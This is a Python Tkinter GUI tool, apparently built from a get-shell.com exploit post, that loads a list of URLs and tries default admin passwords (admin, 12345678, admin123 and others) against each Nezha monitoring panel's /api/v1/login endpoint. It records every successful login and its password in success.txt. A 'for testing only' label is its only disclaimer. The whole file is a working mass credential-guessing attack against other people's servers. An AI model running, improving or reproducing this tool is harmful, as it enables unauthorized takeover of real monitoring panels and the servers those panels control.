"""
tk是由[Tkinter布局助手]生成，https://pytk.net/
利用代码是，https://get-shell.com/6396.html#hidden-box-comment
融合起来用了通义，有很多不足，记得有时间修改有一下
"""

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import random
import tkinter as tk
from tkinter import filedialog
from tkinter import *
from tkinter.ttk import *
import threading



# def read_url(file_path):
#     try:
#         with open(file_path, 'r') as file:
#             urls = [line.strip() for line in file if line.strip()]
#         return urls
#     except FileNotFoundError:
#         print("文件不存在")
#         sys.exit(1)
#
#
#
# def visit_url(urls):
#     for url in urls:
#         if not url.startswith('http'):
#             url = 'https://' + url
#         try:
#             response = requests.get(url, verify=False, timeout=5)
#             login_verification(url)
#         except requests.exceptions.RequestException as e:
#             print(f"{url} 请求失败: {e}")
#
#
# def login_verification(url):
#     headers = {
#         'Accept': '*/*',
#         'Accept-Language': 'zh,zh-CN;q=0.9',
#         'Content-Type': 'application/json',
#         'Proxy-Connection': 'keep-alive',
#         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
#     }
#     password_list = [
#         'admin',
#         '12345678',
#         'password',
#         '123456789',
#         '88888888',
#         'admin123'
#     ]
#     for password in password_list:
#         data = {
#             'username': 'admin',
#             'password': password
#         }
#         response = requests.post(url + '/api/v1/login', headers=headers, json=data, verify=False)
#         if '"success":true' in response.text:
#             with open('success.txt', 'a') as f:
#                 f.write(f"{url} 登录成功, 密码为: {password}\n")
#             print(f"{url} 登录成功, 密码为: {password}")
#             return
#
#
# def select_file():
#     file_path = filedialog.askopenfilename(title="选择 URL 文件", filetypes=[("文本文件", "*.txt")])
#     if file_path:
#         urls = read_url(file_path)
#         if urls:
#             visit_url(urls)
#             messagebox.showinfo("完成", "所有 URL 已处理完毕")
#         else:
#             messagebox.showerror("错误", "没有有效的 URL")

# def create_gui():
#     root = tk.Tk()
#     root.title("哪吒探针 GUI")
#     root.geometry("300x150")
#
#     btn_select_file = tk.Button(root, text="选择 URL 文件", command=select_file)
#     btn_select_file.pack(pady=20)
#
#     root.mainloop()





class WinGUI(Tk):
    def __init__(self):
        super().__init__()
        self.__win()
        self.tk_button_m5p2sq01 = self.__tk_button_m5p2sq01(self)
        self.tk_button_m5p2srju = self.__tk_button_m5p2srju(self)
        self.__tk_button_m5p2 = self.__tk_button_m5p2(self)
        self.tk_input_m5p2sspn = self.__tk_input_m5p2sspn(self)
        self.tk_text_m5p2svxs = self.__tk_text_m5p2svxs(self)
        self.tk_progressbar_m5p2t0da = self.__tk_progressbar_m5p2t0da(self)
        self.tk_label_m5p2t5nb = self.__tk_label_m5p2t5nb(self)
        self.output_box = self.tk_text_m5p2svxs
        self.urls = []  # 用于存储读取的URL列表
        self.current_url_index = 0  # 当前处理的URL索引
    def __win(self):
        self.title("哪吒监控")
        # 设置窗口大小、居中
        width = 600
        height = 500
        screenwidth = self.winfo_screenwidth()
        screenheight = self.winfo_screenheight()
        geometry = '%dx%d+%d+%d' % (width, height, (screenwidth - width) / 2, (screenheight - height) / 2)
        self.geometry(geometry)

        self.resizable(width=False, height=False)

    def scrollbar_autohide(self, vbar, hbar, widget):
        """自动隐藏滚动条"""

        def show():
            if vbar: vbar.lift(widget)
            if hbar: hbar.lift(widget)

        def hide():
            if vbar: vbar.lower(widget)
            if hbar: hbar.lower(widget)

        hide()
        widget.bind("<Enter>", lambda e: show())
        if vbar: vbar.bind("<Enter>", lambda e: show())
        if vbar: vbar.bind("<Leave>", lambda e: hide())
        if hbar: hbar.bind("<Enter>", lambda e: show())
        if hbar: hbar.bind("<Leave>", lambda e: hide())
        widget.bind("<Leave>", lambda e: hide())

    def v_scrollbar(self, vbar, widget, x, y, w, h, pw, ph):
        widget.configure(yscrollcommand=vbar.set)
        vbar.config(command=widget.yview)
        vbar.place(relx=(w + x) / pw, rely=y / ph, relheight=h / ph, anchor='ne')

    def h_scrollbar(self, hbar, widget, x, y, w, h, pw, ph):
        widget.configure(xscrollcommand=hbar.set)
        hbar.config(command=widget.xview)
        hbar.place(relx=x / pw, rely=(y + h) / ph, relwidth=w / pw, anchor='sw')

    def create_bar(self, master, widget, is_vbar, is_hbar, x, y, w, h, pw, ph):
        vbar, hbar = None, None
        if is_vbar:
            vbar = Scrollbar(master)
            self.v_scrollbar(vbar, widget, x, y, w, h, pw, ph)
        if is_hbar:
            hbar = Scrollbar(master, orient="horizontal")
            self.h_scrollbar(hbar, widget, x, y, w, h, pw, ph)
        self.scrollbar_autohide(vbar, hbar, widget)

    def __tk_button_m5p2sq01(self, parent):
        btn = Button(parent, text="开始", takefocus=False, )
        btn.place(x=391, y=99, width=70, height=35)
        return btn

    def __tk_button_m5p2(self, parent):
        btn = Button(parent, text="清空", takefocus=False,)
        btn.place(x=485, y=60, width=70, height=35)
        btn.bind("<Button-1>", lambda event: self.clear_output_box())
        return btn
    def __tk_button_m5p2srju(self, parent):
        btn = Button(parent, text="选择文件", takefocus=False,)
        btn.place(x=485, y=99, width=70, height=35)
        btn.bind("<Button-1>", lambda event: self.select_file())
        return btn

    def __tk_input_m5p2sspn(self, parent):
        ipt = Entry(parent, )
        ipt.place(x=32, y=99, width=332, height=35)
        return ipt

    def __tk_text_m5p2svxs(self, parent):
        text = Text(parent)
        text.place(x=32, y=165, width=537, height=230)
        return text

    def __tk_progressbar_m5p2t0da(self, parent):
        progressbar = Progressbar(parent, orient=HORIZONTAL, mode='determinate')
        progressbar.place(x=31, y=430, width=537, height=30)
        return progressbar

    def __tk_label_m5p2t5nb(self, parent):
        label = Label(parent, text="仅供测试", anchor="center", )
        label.place(x=210, y=10, width=168, height=30)
        return label

    def start_processing(self,urls):
        self.current_url_index = 0
        self.tk_progressbar_m5p2t0da['value'] = 0
        self.tk_progressbar_m5p2t0da['maximum'] = len(self.urls)
        self.visit_url(self.urls)

    def update_text(self, message):
        self.tk_text_m5p2svxs.insert(tk.END, message + "\n")
        self.tk_text_m5p2svxs.see(tk.END)

    def read_url(self,file_path):
        try:
            with open(file_path, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]
            return urls
        except FileNotFoundError:

            print("文件不存在")
            sys.exit(1)

    def clear_output_box(self):

        self.output_box.delete(1.0, tk.END)  # 假设输出框是一个Text组件
        self.output_box.insert(tk.END, "已清空")

    def select_file(self):
        file_path = filedialog.askopenfilename(title="选择 URL 文件", filetypes=[("文本文件", "*.txt")])

        if file_path:
            urls = self.read_url(file_path)
            self.start_processing(urls)
            if urls:
                self.visit_url(urls)
                self.update_text("所有 URL 已处理完毕")
            else:
                self.update_text("没有有效的 URL")

    def visit_url(self, urls):
        # 使用线程来处理长时间运行的任务
        thread = threading.Thread(target=self._visit_url, args=(urls,))
        thread.start()

    def update_progressbar(self):
        self.tk_progressbar_m5p2t0da['value'] = self.current_url_index
        if self.current_url_index == len(self.urls):
            self.update_text("所有 URL 已处理完毕")


    def _visit_url(self, urls):
        for url in urls:
            if not url.startswith('http') or not url.startswith('https'):
                url = 'https://' + url
            try:
                response = requests.get(url, verify=False, timeout=5)
                self.login_verification(url)
            except requests.exceptions.RequestException as e:
                self.update_text(f"{url} 请求失败")
            finally:
                self.current_url_index += 1
                self.update_progressbar()
                #print(f"{url} 请求失败{e}")
    # def visit_url(self, urls):
    #     for url in urls:
    #         if not url.startswith('http') or url.startswith('https'):
    #             url = 'https://' + url
    #         try:
    #             response = requests.get(url, verify=False, timeout=5)
    #             self.login_verification(url)
    #         except requests.exceptions.RequestException as e:
    #             self.update_text(f"{url} 请求失败")
    #             print(f"{url} 请求失败:{e}")

    def login_verification(self, url):
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'zh,zh-CN;q=0.9',
            'Content-Type': 'application/json',
            'Proxy-Connection': 'keep-alive',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
        }
        password_list = [
            'admin',
            '12345678',
            'password',
            '123456789',
            '88888888',
            'admin123'
        ]
        for password in password_list:
            data = {
                'username': 'admin',
                'password': password
            }
            response = requests.post(url + '/api/v1/login', headers=headers, json=data, verify=False)
            print(password)
            if '"success":true' in response.text:
                self.update_text(f"{url} 登录成功, 密码为: {password}")
                with open('success.txt', 'a') as f:
                    f.write(f"{url} 登录成功, 密码为: {password}\n")
                return
        self.update_text(f"{url} 登录失败")


class Win(WinGUI):
    def __init__(self, controller):
        self.ctl = controller
        super().__init__()
        self.__event_bind()
        self.__style_config()
        self.ctl.init(self)

    def __event_bind(self):
        pass

    def __style_config(self):
        pass


if __name__ == "__main__":
    win = WinGUI()
    win.mainloop()


# if __name__ == '__main__':
#     if len(sys.argv) < 2:
#         print("请输入文件路径")
#         sys.exit(1)
#
#     urls= read_url(sys.argv[1])
#     if urls:
#         visit_url(urls)
#     else:
#         print("There is no valid URL to access")
#         sys.exit(1)


